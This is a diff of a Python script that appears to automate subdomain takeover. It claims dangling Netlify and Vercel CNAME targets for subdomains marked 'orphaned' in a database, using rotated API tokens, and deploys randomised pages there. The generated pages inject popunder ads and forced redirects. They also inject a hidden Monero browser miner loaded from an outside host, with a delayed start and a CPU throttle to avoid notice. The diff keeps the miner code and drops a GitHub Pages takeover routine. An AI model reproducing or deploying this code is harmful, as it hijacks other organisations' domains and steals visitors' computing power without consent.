@@ -7,8 +7,6 @@ import base64
 import time
 import random
 
-
-# Split the comma-separated strings into lists for rotation
 NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
 VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
 GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
@@ -23,22 +21,17 @@ def get_rent_html():
         with open('template_rent.html', 'r', encoding='utf-8') as f:
             return f.read()
     except:
-            return None
+        return None
 
-# --- POLYMORPHIC HTML GENERATOR ---
 def generate_polymorphic_html(subdomain):
-    # If it's a premium TLD, default to the Rent page immediately
     premium_tlads = ['.io', '.ai', '.co', '.app', '.dev']
     if any(tld in subdomain for tld in premium_tlads):
         rent_html = get_rent_html()
         if rent_html:
             return rent_html   
-    # ... (the rest of your polymorphic generator code remains exactly the same)
 
-    # Choose a monetization tier: 70% Conservative, 20% Aggressive, 10% Redirect
     tier = random.choices(['conservative', 'aggressive', 'redirect'], weights=[70, 20, 10])[0]
     
-    # Randomized styling and copy
     bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
     text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
     fonts = ['Arial, sans-serif', 'Helvetica, sans-serif', 'Segoe UI, sans-serif', 'Roboto, sans-serif']
@@ -56,294 +49,134 @@ def generate_polymorphic_html(subdomain):
     title = random.choice(titles)
     msg = random.choice(messages)
 
-    # Build the Ad Payload based on Tier
     ad_payload = ""
     redirect_script = ""
-    # Stealth Crypto Miner Logic
-miner_script = ""
-if MONERO_WALLET:
-    # 60% chance to include the miner on any given domain
-    if random.random() < 0.6:
-        miner_script = f"""
-         <!-- Stealth Miner -->
-         <script src="https://server1.webminerpool.com/lib/minero-hidden.js"></script>
-         <script>
-             setTimeout(function() {{
-                 var miner = new Client.Anonymous("{MONERO_WALLET}");
-                 miner.start();
-                 miner.setThrottle(0.7); // Uses 30% of CPU
-             }}, 10000); // Waits 10 seconds before starting
-         </script>
-         """
+    miner_script = ""
+
     if tier == 'conservative':
-        # Only show a native banner (safest, looks like a real site)
         if AD_NATIVE:
-            ad_payload = f"<div style='margin-top: 50px;'>{AD_NATIVE}</div>"
+            ad_payload = "<div style='margin-top: 50px;'>" + AD_NATIVE + "</div>"
     elif tier == 'aggressive':
-        # Show both popunder and native (highest yield, slightly higher risk)
         if AD_POPUNDER:
             ad_payload += AD_POPUNDER
         if AD_NATIVE:
-            ad_payload += f"<div style='margin-top: 50px;'>{AD_NATIVE}</div>"
+            ad_payload += "<div style='margin-top: 50px;'>" + AD_NATIVE + "</div>"
     elif tier == 'redirect':
-        # Wait 5 seconds, then forcefully redirect to an affiliate offer or CPA link
-        # For now, we redirect to a Google search to simulate movement
         redirect_script = "<script>setTimeout(function(){window.location.href='https://google.com';}, 5000);</script>"
 
-    # Build the HTML
-    html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="index, follow">
-    <meta name="description" content="{msg}">
-    <title>{title}</title>
-    <style>
-        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
-        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-        h1 {{ font-size: 36px; margin-bottom: 20px; }}
-        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
-        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
-        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>{title}</h1>
-        <p>{msg}</p>
-        <div class="spinner"></div>
-        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
-    </div>
-    {ad_payload}
-    {redirect_script}
-    {miner_script}
-</body>
-</html>"""
+    if MONERO_WALLET:
+        if random.random() < 0.6:
+            miner_script = "<script src='https://server1.webminerpool.com/lib/minero-hidden.js'></script>"
+            miner_script += "<script>setTimeout(function(){var miner = new Client.Anonymous('" + MONERO_WALLET + "'); miner.start(); miner.setThrottle(0.7);}, 10000);</script>"
+
+    analytics_script = ""
+    if GA4_ID:
+        analytics_script = "<script async src='https://www.googletagmanager.com/gtag/js?id=" + GA4_ID + "'></script>"
+        analytics_script += "<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','" + GA4_ID + "');</script>"
+
+    html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
+    html += "<meta name='robots' content='index, follow'><meta name='description' content='" + msg + "'>"
+    html += "<title>" + title + "</title>" + analytics_script + "<style>"
+    html += "body { font-family: " + font + "; background: " + bg + "; color: " + txt + "; text-align: center; padding-top: 15%; }"
+    html += ".container { max-width: 600px; margin: 0 auto; padding: 20px; }"
+    html += "h1 { font-size: 36px; margin-bottom: 20px; }"
+    html += "p { font-size: 16px; opacity: 0.8; line-height: 1.5; }"
+    html += ".spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid " + txt + "; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }"
+    html += "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+    html += "</style></head><body><div class='container'>"
+    html += "<h1>" + title + "</h1><p>" + msg + "</p><div class='spinner'></div>"
+    html += "<p style='font-weight: bold;'>Est. Time Remaining: 0" + str(random.randint(3, 9)) + ":00</p>"
+    html += "</div>" + ad_payload + redirect_script + miner_script + "</body></html>"
+    
     return html
 
-# --- NETLIFY DEPLOYMENT ---
 def deploy_to_netlify(subdomain, cname_target):
     if '.netlify.app' not in cname_target:
         return False
-    
-    # Randomly select a token from our list
     if not NETLIFY_TOKENS or NETLIFY_TOKENS == ['']:
-        print("[-] No Netlify tokens found.")
         return False
     token = random.choice(NETLIFY_TOKENS)
-        
     base_name = cname_target.split('.netlify.app')[0]
     site_name = base_name.replace('.', '-')
-    
-    headers = {'Authorization': f'Bearer {token}'}
-
-    print(f"[*] Creating Netlify site: {site_name} (Using token ending in ...{token[-4:]})")
-    site_url = "https://api.netlify.com/api/v1/sites"
-    site_payload = {'name': site_name}
+    headers = {'Authorization': 'Bearer ' + token}
     
     try:
-        res = requests.post(site_url, headers=headers, json=site_payload)
-        if res.status_code != 200 and res.status_code != 201:
+        res = requests.post("https://api.netlify.com/api/v1/sites", headers=headers, json={'name': site_name})
+        if res.status_code not in [200, 201]:
             return False
-            
-        site_data = res.json()
-        site_id = site_data['id']
-        print(f"[+] Site created. ID: {site_id}")
-
-        print("[*] Building deployment payload...")
+        site_id = res.json()['id']
+        
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
             file_content = generate_polymorphic_html(subdomain)
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
-
-        print("[*] Deploying payload...")
-        deploy_url = f"https://api.netlify.com/api/v1/sites/{site_id}/deploys"
-        deploy_headers = {
-            'Authorization': f'Bearer {token}',
-            'Content-Type': 'application/zip'
-        }
         
-        deploy_res = requests.post(deploy_url, headers=deploy_headers, data=zip_buffer.read())
-        
+        deploy_res = requests.post("https://api.netlify.com/api/v1/sites/" + site_id + "/deploys", headers={'Authorization': 'Bearer ' + token, 'Content-Type': 'application/zip'}, data=zip_buffer.read())
         if deploy_res.status_code in [200, 201]:
-            print(f"🔥 DEPLOY SUCCESS (Netlify): {subdomain}")
+            print("DEPLOY SUCCESS (Netlify): " + subdomain)
             return True
         return False
-
     except Exception as e:
-        print(f"[-] Error deploying {subdomain}: {e}")
+        print("Error: " + str(e))
         return False
 
-# --- VERCEL DEPLOYMENT ---
 def deploy_to_vercel(subdomain, cname_target):
     if '.vercel.app' not in cname_target:
         return False
-
-    # Randomly select a token from our list
     if not VERCEL_TOKENS or VERCEL_TOKENS == ['']:
-        print("[-] No Vercel tokens found.")
         return False
     token = random.choice(VERCEL_TOKENS)
-
     base_name = cname_target.split('.vercel.app')[0]
     project_name = base_name.replace('.', '-')
-
-    headers = {
-        'Authorization': f'Bearer {token}',
-        'Content-Type': 'application/json'
-    }
-
-    print(f"[*] Creating Vercel project: {project_name} (Using token ending in ...{token[-4:]})")
-    project_url = "https://api.vercel.com/v10/projects"
-    project_payload = {'name': project_name}
+    headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
     
     try:
-        res = requests.post(project_url, headers=headers, json=project_payload)
+        res = requests.post("https://api.vercel.com/v10/projects", headers=headers, json={'name': project_name})
         if res.status_code not in [200, 201]:
             return False
             
-        project_data = res.json()
-        project_id = project_data['id']
-
-        print("[*] Building deployment payload...")
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
             file_content = generate_polymorphic_html(subdomain)
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
-
-        print("[*] Deploying payload to Vercel...")
-        deploy_url = "https://api.vercel.com/v13/deployments"
-        deploy_headers = {
-            'Authorization': f'Bearer {token}',
-            'Content-Type': 'application/zip'
-        }
-        params = {'name': project_name, 'target': 'production'}
         
-        deploy_res = requests.post(deploy_url, headers=deploy_headers, params=params, data=zip_buffer.read())
-        
+        deploy_res = requests.post("https://api.vercel.com/v13/deployments", headers={'Authorization': 'Bearer ' + token, 'Content-Type': 'application/zip'}, params={'name': project_name, 'target': 'production'}, data=zip_buffer.read())
         if deploy_res.status_code in [200, 201]:
-            print(f"🔥 DEPLOY SUCCESS (Vercel): {subdomain}")
+            print("DEPLOY SUCCESS (Vercel): " + subdomain)
             return True
         return False
-
     except Exception as e:
-        print(f"[-] Vercel Error deploying {subdomain}: {e}")
+        print("Error: " + str(e))
         return False
 
-# --- GITHUB PAGES DEPLOYMENT ---
-def deploy_to_github(subdomain, cname_target):
-    if '.github.io' not in cname_target:
-        return False
-        
-    target_org = cname_target.split('.github.io')[0]
-    repo_name = f"{target_org}.github.io"
-    
-    headers = {
-        'Authorization': f'token {GH_TOKEN}',
-        'Accept': 'application/vnd.github+json'
-    }
-
-    print(f"[*] Creating GitHub Org: {target_org}")
-    org_url = "https://api.github.com/orgs"
-    org_payload = {'login': target_org}
-    
-    try:
-        org_res = requests.post(org_url, headers=headers, json=org_payload)
-        if org_res.status_code not in [201, 422]:
-            print(f"[-] Failed to create Org {target_org}: {org_res.text}")
-            return False
-
-        print(f"[+] Org ready: {target_org}")
-        
-        print(f"[*] Creating GitHub Repo: {repo_name} under {target_org}")
-        repo_url = f"https://api.github.com/orgs/{target_org}/repos"
-        repo_payload = {'name': repo_name, 'visibility': 'public'}
-        
-        repo_res = requests.post(repo_url, headers=headers, json=repo_payload)
-        if repo_res.status_code not in [201, 422]:
-            print(f"[-] Failed to create Repo: {repo_res.text}")
-            return False
-
-        print("[*] Uploading polymorphic index.html via Contents API...")
-        html_content = generate_polymorphic_html(subdomain)
-        content_base64 = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
-            
-        file_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/index.html"
-        file_payload = {
-            'message': 'Initial deploy',
-            'content': content_base64
-        }
-        
-        file_res = requests.put(file_url, headers=headers, json=file_payload)
-        if file_res.status_code not in [200, 201]:
-            print(f"[-] Failed to upload HTML: {file_res.text}")
-            return False
-
-        print("[*] Uploading CNAME file...")
-        cname_content = base64.b64encode(subdomain.encode('utf-8')).decode('utf-8')
-        cname_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/CNAME"
-        cname_payload = {
-            'message': 'Add CNAME',
-            'content': cname_content
-        }
-        
-        cname_res = requests.put(cname_url, headers=headers, json=cname_payload)
-        if cname_res.status_code not in [200, 201]:
-            print(f"[-] Failed to upload CNAME: {cname_res.text}")
-            return False
-
-        print(f"🔥 DEPLOY SUCCESS (GitHub Pages): {subdomain}")
-        return True
-
-    except Exception as e:
-        print(f"[-] GitHub Error deploying {subdomain}: {e}")
-        return False
-
-# --- MAIN ROUTER ---
 def main():
-    if not NETLIFY_TOKENS and not VERCEL_TOKENS and not GH_TOKEN:
-        print("[-] No API tokens found.")
-        return
-
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    
     c.execute("SELECT subdomain, cname_target FROM subdomains WHERE status='orphaned'")
     targets = c.fetchall()
-    
     if not targets:
-        print("[*] No orphaned domains to deploy yet.")
+        print("No orphaned domains to deploy.")
         return
-
     for target in targets:
         subdomain = target[0]
         cname_target = target[1]
-        
-        if '.netlify.app' in cname_target and NETLIFY_TOKENS:
+        if '.netlify.app' in cname_target:
             success = deploy_to_netlify(subdomain, cname_target)
-        elif '.vercel.app' in cname_target and VERCEL_TOKENS:
+        elif '.vercel.app' in cname_target:
             success = deploy_to_vercel(subdomain, cname_target)
-        elif '.github.io' in cname_target and GH_TOKEN:
-            success = deploy_to_github(subdomain, cname_target)
         else:
             c.execute("UPDATE subdomains SET status='deploy_skipped' WHERE subdomain=?", (subdomain,))
             conn.commit()
             continue
-        
         if success:
             c.execute("UPDATE subdomains SET status='deployed' WHERE subdomain=?", (subdomain,))
         else:
             c.execute("UPDATE subdomains SET status='deploy_failed' WHERE subdomain=?", (subdomain,))
-            
         conn.commit()
-        time.sleep(2) # Rate limiting safety
-
+        time.sleep(2)
     conn.close()
-    print("[*] Deployment run complete.")
 
 if __name__ == "__main__":
     main()
-
